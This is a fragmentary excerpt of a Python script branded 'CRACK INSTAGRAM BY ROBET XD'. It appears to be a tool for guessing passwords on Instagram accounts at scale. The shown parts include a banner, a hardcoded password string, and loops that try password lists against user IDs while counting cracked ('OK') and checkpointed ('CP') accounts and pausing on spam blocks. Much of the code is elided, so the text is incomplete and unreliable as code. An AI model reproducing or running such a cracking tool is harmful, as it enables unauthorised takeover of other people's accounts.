...
Password = "YADAROBET028" # --> Data Req Api key --> open_kt(life)("MSRXXIYNNHLLLEE")
...
\t╚═══╩═══╩═══╩╝╚═╩══╩═══╝""",title=f"{P2}{H2}{self.timeLine()}",width=80,padding=(0,4),style=f"{color_table}"))
    def logoo(self):
        self.clear()
      #  prints(f"{H2}CRACK INSTAGRAM BY ROBET XD{reset}")
        prints(Panel(f"""{H2}      
   █████╗░░█████╗░██████╗░███████╗████████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝
██████╔╝██║░░██║██████╦╝█████╗░░░░░██║░░░
...
╚═╝░░╚═╝░╚════╝░╚═════╝░╚══════╝░░░╚═╝░░░            
        ...
        CRACK INSTAGRAM BY ROBET XD""",title=f"{P2}{H2}{self.timeLine()}",width=80,padding=(0,4),style=f"{color_table}"))
...
{N}[{H}+{N}] {H}•• LIVE ••{N}
 ...
 {N}├╴>{N} following : {H}{ful}{N}
    ...
    def crakersAPI(self, user, pasw):
        prog.update(des,description=f"[{H2} ROBET XD {P2}] ( {H2}stabil{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
        prog.advance(des)
    ...
    def Ngocok(self, user, pasw):
        ...
        prog.update(des,description=f" ROBET XD ( {H2}stabil{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
        prog.advance(des)
        for password in pasw:
            try:
             ...
             #       os.popen('play-audio raycp.mp3')
                    ...
                    prog.update(des,description=f"ROBET XD ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                    time.sleep(15)
            except requests.exceptions.ConnectionError:
                prog.update(des,description=f"ROBET XD ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                prog.advance(des)
